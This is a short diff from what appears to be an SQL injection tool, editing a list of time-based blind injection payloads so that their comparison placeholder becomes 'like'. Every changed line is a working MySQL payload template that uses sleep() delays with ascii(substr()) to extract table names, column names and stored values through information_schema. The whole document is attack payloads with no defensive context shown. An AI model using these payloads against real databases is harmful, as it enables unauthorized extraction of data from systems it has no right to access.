@@ -29,7 +29,7 @@ sQLAndingPayload = [
 ]
 
 sqlTimePayload = [
-    "' and (select sleep(2) from dual where ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {row},1), {pos}, 1)) {op} {x}) #",
-    "' and (select sleep(2) from dual where ascii(substr((select column_name from information_schema.columns where table_name='{tblName}' limit {row},1), {pos}, 1)) {op} {x}) #",
-    "' and (select sleep(2) from dual where ascii(substr((select {clmName} from {tblName} limit {row},1), {pos}, 1)) {op} {x}) #"
+    "' and (select sleep(2) from dual where ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {row},1), {pos}, 1)) like {x}) #",
+    "' and (select sleep(2) from dual where ascii(substr((select column_name from information_schema.columns where table_name='{tblName}' limit {row},1), {pos}, 1)) like {x}) #",
+    "' and (select sleep(2) from dual where ascii(substr((select {clmName} from {tblName} limit {row},1), {pos}, 1)) like {x}) #"
 ]
